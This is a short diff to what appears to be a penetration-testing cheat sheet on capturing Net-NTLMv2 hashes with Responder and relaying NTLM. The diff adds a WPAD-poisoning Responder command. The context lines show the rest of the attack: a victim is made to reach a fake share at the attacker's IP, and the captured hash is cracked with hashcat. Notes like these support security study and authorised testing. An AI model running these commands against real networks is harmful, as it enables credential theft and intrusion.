@@ -1,4 +1,4 @@
-# Net-NTLMv2, Responder & NTLM Relay
+# Net-NTLMv2, Responder & Relay
 
 ## Net-NTLMv2
 
@@ -7,6 +7,8 @@
 ```bash
 # Start Responder on Kali
 sudo responder -I tun0
+# With WPAD
+sudo responder -I eth0 -vwF
 
 # From victim machine — trigger auth to a non-existent share
 dir \\<our-ip>\random-share
@@ -15,7 +17,7 @@ dir \\<our-ip>\random-share
 hashcat -m 5600 captured.hash /usr/share/wordlists/rockyou.txt --force
 ```
 
----
+***
 
 ## NTLM Relay
 
